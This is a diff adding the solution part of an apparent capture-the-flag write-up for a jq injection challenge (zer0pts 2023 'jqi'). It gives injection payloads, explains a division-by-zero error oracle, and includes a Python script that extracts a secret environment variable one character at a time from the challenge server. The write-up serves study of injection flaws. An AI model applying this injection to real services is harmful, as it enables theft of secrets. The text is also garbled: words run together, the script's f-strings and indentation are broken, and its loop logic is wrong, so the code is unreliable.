@@ -33,3 +33,35 @@ The condition (str.includes('"') || str.includes('\\(')) checks if the string co
 Assuming the key and str are both valid and not attempting to perform a hack, the code constructs a partial jq query that will filter the JSON data based on the condition.
 The format of the partial query is: | select(.key | contains("str")).
 + Payloads:
+- \ in name
+- ))]|123# in name
+
++ if conditions are given by a user, the app prints a sorry, you cannot use filters in demo versionand doesn't give us the result of the query. this as an oracle like Error-based SQL injection like getting an information if a condition is met, for example, the first character of the flag is zor not
++ You can use zero division to do Error-based jq injection like the below. Setting a divisor to a condition like if env.FLAG[0:1] == "z" then 0 else 1 endthat you want to know it is met or not, if the first character of env.FLAGis z, then error occurs because a dividend is divided by 0
+
+```
+import requests
+
+HOST = 'http://jqi.2023.zer0pts.com:8300'
+
+def  query (i, c):
+    r = requests.get(f '{HOST}/api/search' , params={
+         'keys' : 'name,author' ,
+         'conds' : ',' .join(x for x in [
+             ' \\ in name ' ,
+            f '))]|env.FLAG[{i}:{i+1}]as$c|([{c}]|implode|1/(if($c==.)then(0)else( 1)end))# in name'
+        ])
+    })
+    return  'something'  in r.json()[ 'error' ]
+
+i = 0 
+flag = '' 
+while  not flag.endswith( '}' ):
+     for c in  range ( 0x20 , 0x7f ):
+         if query(i, c):
+            flag += chr (c)
+             continue 
+    print (i, flag)
+    i+= 1
+```
+This makes characters like [123]|implodeand checks those characters are same as the nth character of the flag.By repeating this, it steals the flag character by character.
